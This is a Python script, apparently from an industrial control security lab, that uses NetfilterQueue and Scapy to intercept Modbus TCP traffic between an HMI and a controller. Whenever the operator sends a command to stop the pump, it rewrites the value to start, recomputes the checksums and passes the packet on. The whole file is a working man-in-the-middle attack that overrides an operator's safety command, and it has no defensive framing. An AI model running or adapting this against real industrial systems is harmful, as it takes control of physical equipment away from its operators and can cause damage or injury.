import sys
sys.path.insert(0, "/app")
from netfilterqueue import NetfilterQueue
from scapy.all import IP, TCP, Raw
from shared.config import REG_PUMP

def process(pkt):
    scapy_pkt = IP(pkt.get_payload())
    if scapy_pkt.haslayer(Raw):
        data = bytes(scapy_pkt[Raw].load)
        # Modbus: MBAP(7) + FC(1) + reg(2) + value(2)
        if len(data) >= 12 and data[7] == 6:          # FC 6 = write single register
            reg = int.from_bytes(data[8:10], "big")
            val = int.from_bytes(data[10:12], "big")
            if reg == REG_PUMP and val == 0:           # HMI says: stop the pump
                print(f"[INTERCEPT] HMI -> stop pump. Rewriting to START.")
                new_data = data[:10] + (1).to_bytes(2, "big")   # force value = 1
                scapy_pkt[Raw].load = new_data
                del scapy_pkt[IP].len
                del scapy_pkt[IP].chksum
                del scapy_pkt[TCP].chksum               # scapy recomputes these
                pkt.set_payload(bytes(scapy_pkt))
    pkt.accept()

nfq = NetfilterQueue()
nfq.bind(1, process)
print("[*] Intercepting Modbus writes on queue 1... Ctrl+C to stop")
try:
    nfq.run()
except KeyboardInterrupt:
    print("\n[*] Stopped")
    nfq.unbind()
